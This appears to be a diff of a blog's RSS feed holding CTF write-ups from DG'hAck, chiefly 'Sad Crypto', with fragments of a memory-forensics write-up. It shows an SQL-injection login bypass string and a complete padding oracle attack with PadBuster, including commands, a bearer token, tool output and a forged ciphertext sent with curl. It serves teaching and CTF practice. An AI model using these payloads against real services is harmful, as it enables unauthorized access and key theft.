+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Sad Crypto</title><link>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</link><pubDate>Mon, 30 Nov 2020 01:33:35 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</guid><description>This challenge starts with a login page:
 From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: 1-46-85-30-750-318-37.
 admin/admin doesn&amp;rsquo;t seem to work, let&amp;rsquo;s try an SQLi! Entering &amp;quot; or 1=1 -- as the username reveals a second page:
-We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099.</description></item><item><title>Writeup DG'hAck: Shadowmallet</title><link>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</link><pubDate>Sat, 28 Nov 2020 06:44:23 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</guid><description>This challenge starts with a file called shadowmallet. We&amp;rsquo;re asked to help an administrator whose server detected an abnormal activity.
+We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099.</description><content>&lt;p>This challenge starts with a login page:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/sad-crypto-login.png">&lt;img src="https://nicolasb.fr/assets/dghack/sad-crypto-login.png" alt="The login page">&lt;/a>&lt;/p>
+&lt;p>From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: &lt;code>1-46-85-30-750-318-37&lt;/code>.&lt;/p>
+&lt;p>&lt;code>admin/admin&lt;/code> doesn&amp;rsquo;t seem to work, let&amp;rsquo;s try an SQLi! Entering &lt;code>&amp;quot; or 1=1 --&lt;/code> as the username reveals a second page:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/sad-crypto-enter-name.png">&lt;img src="https://nicolasb.fr/assets/dghack/sad-crypto-enter-name.png" alt="The key generation page">&lt;/a>&lt;/p>
+&lt;p>We seem to be able to enter a patient name (that we &lt;strong>have&lt;/strong> to auto-complete), and get a decryption key: &lt;code>797b4c-c4bd852fe0e32ebda194cb2a9fe00099&lt;/code>.&lt;/p>
+&lt;p>Looking at the network tab of firefox, we can see the requests that were made:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/sad-crypto-requests.png">&lt;img src="https://nicolasb.fr/assets/dghack/sad-crypto-requests.png" alt="The list of requests made while generating a key">&lt;/a>&lt;/p>
+&lt;p>The first request doesn&amp;rsquo;t seem interesting, the second, third and fourth ones are for the auto-complete fields and the last two are used to generate the key.&lt;/p>
+&lt;p>The &lt;code>validate&lt;/code> request is a POST that contains an SSN (eg: &lt;code>ssn=1-78-67-78-356-789-12&lt;/code>). It returns a JSON object:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
+&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;data&amp;#34;&lt;/span>: {
+&lt;span style="color:#f92672">&amp;#34;keyRequest&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90&amp;#34;&lt;/span>
+}
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The hash is the same one that&amp;rsquo;s used in the last request. The URL format seems to be &lt;code>/api/v1/keygen/{hash}&lt;/code>. The response contains the decryption key, without the dash and with more chars:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
+&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;hash&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;797b4cc4bd852fe0e32ebda194cb2a9fe00099427615c4aae33ad77c9fa298fd&amp;#34;&lt;/span>
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Our first reflex should be to try and pass the SSN that we have to &lt;code>/validate&lt;/code>. Unfortunately, the server sends back an error:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
+&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Cette ressource est verrouillée&amp;#34;&lt;/span>
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s try to find what kind of hash this is:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ hashid f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
+Analyzing &lt;span style="color:#e6db74">&amp;#39;f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> SHA-384
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> SHA3-384
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Skein-512&lt;span style="color:#f92672">(&lt;/span>384&lt;span style="color:#f92672">)&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Skein-1024&lt;span style="color:#f92672">(&lt;/span>384&lt;span style="color:#f92672">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>SHA-384 doesn&amp;rsquo;t seem to be vulnerable to any kind of interesting vulnerabilities.. Trying to base64 decode it works, but spits out unrecognizable bytes:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ base64 -d &lt;span style="color:#f92672">&amp;lt;&amp;lt;&amp;lt;&lt;/span> f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
+�|���m��m�_���������վ5&lt;span style="color:#f92672">}&lt;/span>�����&lt;span style="color:#f92672">{&lt;/span>N����kF�����^��8�W&lt;span style="color:#f92672">=&lt;/span>ۯ&lt;span style="color:#f92672">}&lt;/span>�w��Ɲ����f����y�t%
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now an interesting thing is that if the hash is slightly modified, for example by switching the &lt;code>f&lt;/code> with an &lt;code>a&lt;/code>, we get an error:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
+&lt;span style="color:#f92672">&amp;#34;ssn&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;!-78-67-78-356-789-12&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;success&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;le numéro de sécurité sociale soumis est invalide&amp;#34;&lt;/span>
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The SSN changed! Let&amp;rsquo;s try another modification:&lt;/p>
+&lt;pre>&lt;code>Internal Server Error
+&lt;/code>&lt;/pre>&lt;p>And we have an error 500. This &lt;em>should&lt;/em> make us think of an &lt;a href="https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth">oracle padding attack&lt;/a>: we know if the hash padding is correct or not when modifying it, since it causes an error. It works independently of the cipher that is used.&lt;/p>
+&lt;p>There are multiple scripts available to exploit this vulnerability, we&amp;rsquo;ll use &lt;a href="https://github.com/AonCyberLabs/PadBuster">PadBuster&lt;/a>. We need to give it a few informations:&lt;/p>
+&lt;ul>
+&lt;li>the error string (or just let it use status codes)&lt;/li>
+&lt;li>the authentication headers&lt;/li>
+&lt;li>the URL&lt;/li>
+&lt;li>the hash we&amp;rsquo;re trying to attack&lt;/li>
+&lt;li>the block size&lt;/li>
+&lt;li>the encoding of the hash&lt;/li>
+&lt;/ul>
+&lt;p>We&amp;rsquo;ll set the encoding to &lt;code>1&lt;/code>, for lowercase hex, and the block size (after a bit of trial and error) to 16.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ perl padBuster.pl -error &lt;span style="color:#e6db74">&amp;#39;Internal Server Error&amp;#39;&lt;/span> -header &lt;span style="color:#e6db74">&amp;#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&amp;#39;&lt;/span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 &lt;span style="color:#ae81ff">16&lt;/span> -encoding &lt;span style="color:#ae81ff">1&lt;/span>
++-------------------------------------------+
+| PadBuster - v0.3.3 |
+| Brian Holyfield - Gotham Digital Science |
+| labs@gdssecurity.com |
++-------------------------------------------+
+INFO: The original request returned the following
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Status: &lt;span style="color:#ae81ff">200&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Location: N/A
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Content Length: &lt;span style="color:#ae81ff">103&lt;/span>
+INFO: Starting PadBuster Decrypt Mode
+*** Starting Block &lt;span style="color:#ae81ff">1&lt;/span> of &lt;span style="color:#ae81ff">2&lt;/span> ***
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>137/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 16&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>204/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 15&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>252/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 14&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>225/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 13&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>187/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 12&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>146/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 11&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>62/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>156/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 9&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>133/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 8&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>125/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 7&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>57/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 6&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>102/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 5&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>125/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 4&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>83/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 3&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>6/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 2&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>39/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 1&lt;span style="color:#f92672">]&lt;/span>
+Block &lt;span style="color:#ae81ff">1&lt;/span> Results:
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Cipher Text &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: fdb2673ae06987a3a0b3644d9e1e46c4
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Intermediate Bytes &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: c9f5a38e96cc89726cc568401b073676
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Plain Text: 1-78-67-78-356-7
+Use of uninitialized value $plainTextBytes in concatenation &lt;span style="color:#f92672">(&lt;/span>.&lt;span style="color:#f92672">)&lt;/span> or string at padBuster.pl line 361.
+*** Starting Block &lt;span style="color:#ae81ff">2&lt;/span> of &lt;span style="color:#ae81ff">2&lt;/span> ***
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>50/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 16&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>177/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 15&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>234/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 14&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>111/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 13&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>189/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 12&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>151/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 11&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>65/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>93/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 9&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>95/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 8&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>122/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 7&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>151/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 6&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>34/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 5&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>250/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 4&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>188/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 3&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>124/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 2&lt;span style="color:#f92672">]&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Success: &lt;span style="color:#f92672">(&lt;/span>43/256&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>Byte 1&lt;span style="color:#f92672">]&lt;/span>
+Block &lt;span style="color:#ae81ff">2&lt;/span> Results:
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Cipher Text &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: 81c9269993ea9cad943862a197bbeb90
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Intermediate Bytes &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: c58b4a0bd2628ca8abb86f4695154dcf
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Plain Text: 89-12
+-------------------------------------------------------
+** Finished ***
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Decrypted value &lt;span style="color:#f92672">(&lt;/span>ASCII&lt;span style="color:#f92672">)&lt;/span>: 1-78-67-78-356-789-12
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Decrypted value &lt;span style="color:#f92672">(&lt;/span>HEX&lt;span style="color:#f92672">)&lt;/span>: 312D37382D36372D37382D3335362D3738392D31320B0B0B0B0B0B0B0B0B0B0B
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Decrypted value &lt;span style="color:#f92672">(&lt;/span>Base64&lt;span style="color:#f92672">)&lt;/span>: MS03OC02Ny03OC0zNTYtNzg5LTEyCwsLCwsLCwsLCws&lt;span style="color:#f92672">=&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And it worked! The plaintext was the SSN. Now we just have to encrypt our number:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ perl padBuster.pl -error &lt;span style="color:#e6db74">&amp;#39;Internal Server Error&amp;#39;&lt;/span> -header &lt;span style="color:#e6db74">&amp;#39;authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&amp;#39;&lt;/span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 &lt;span style="color:#ae81ff">16&lt;/span> -encoding &lt;span style="color:#ae81ff">1&lt;/span> -plaintext &lt;span style="color:#e6db74">&amp;#39;1-46-85-30-750-318-37&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>...&lt;span style="color:#f92672">]&lt;/span>
+-------------------------------------------------------
+** Finished ***
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Encrypted value is: 2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s try to exchange our hash for a decryption key:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -H &lt;span style="color:#e6db74">&amp;#39;authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU&amp;#39;&lt;/span> http://sadcrypto.chall.malicecyber.com/api/v1/keygen/2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000 | jq
+&lt;span style="color:#f92672">{&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;success&amp;#34;&lt;/span>: true,
+&lt;span style="color:#e6db74">&amp;#34;message&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;hash&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2ed35bfd91f07094b4447deac135cb8d4b6e45a69cf7a59a65b5f1ca35698e58&amp;#34;&lt;/span>
+&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we just have to format it as the webapp does to get the flag: &lt;code>2ed35b-fd91f07094b4447deac135cb8d4b6e45&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Shadowmallet</title><link>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</link><pubDate>Sat, 28 Nov 2020 06:44:23 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</guid><description>This challenge starts with a file called shadowmallet. We&amp;rsquo;re asked to help an administrator whose server detected an abnormal activity.
 The file command doesn&amp;rsquo;t give us anything:
 $ file shadowmallet shadowmallet: data But searching for the first few bytes (53ff 00f0 53ff 00f0 53ff 00f0 53ff 00f0) of the file online quickly reveals it&amp;rsquo;s a memory dump. Let&amp;rsquo;s use volatility!
-$ volatility -f shadowmallet imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.</description></item><item><title>Writeup DG'hAck: Gitbad</title><link>https://nicolasb.fr/blog/writeup-dghack-gitbad/</link><pubDate>Sat, 28 Nov 2020 05:12:47 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-gitbad/</guid><description>This challenge takes place on a Gitlab instance, where we have to find private data. You start by creating an account, which is automatically validated after a few seconds. Once logged in, you can do a few things, for example:
-create a project create a group edit your profile see the help page see public repositories Nothing seems to be particularly interesting, except for this message, on the help page:</description></item><item><title>Writeup DG'hAck: Involucrypt 1</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</link><pubDate>Fri, 20 Nov 2020 00:27:19 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</guid><description>This writeup uses a naive approach, see my writeup of involucrypt 2 for a better solution.
+$ volatility -f shadowmallet imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.</description><content>&lt;p>This challenge starts with a file called &lt;code>shadowmallet&lt;/code>. We&amp;rsquo;re asked to help an administrator whose server detected an abnormal activity.&lt;/p>
+&lt;p>The &lt;code>file&lt;/code> command doesn&amp;rsquo;t give us anything:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file shadowmallet
+shadowmallet: data
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>But searching for the first few bytes (&lt;code>53ff 00f0 53ff 00f0 53ff 00f0 53ff 00f0&lt;/code>) of the file online quickly reveals it&amp;rsquo;s a memory dump. Let&amp;rsquo;s use volatility!&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility -f shadowmallet imageinfo
+Volatility Foundation Volatility Framework 2.6.1
+INFO : volatility.debug : Determining profile based on KDBG search...
+Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : No suggestion &lt;span style="color:#f92672">(&lt;/span>Instantiated with Linuxdebiancustomx64&lt;span style="color:#f92672">)&lt;/span>
+AS Layer1 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>/home/vivescere/Projects/dghack/shadow-mallet/shadowmallet&lt;span style="color:#f92672">)&lt;/span>
+PAE type : No PAE
+DTB : -0x1L
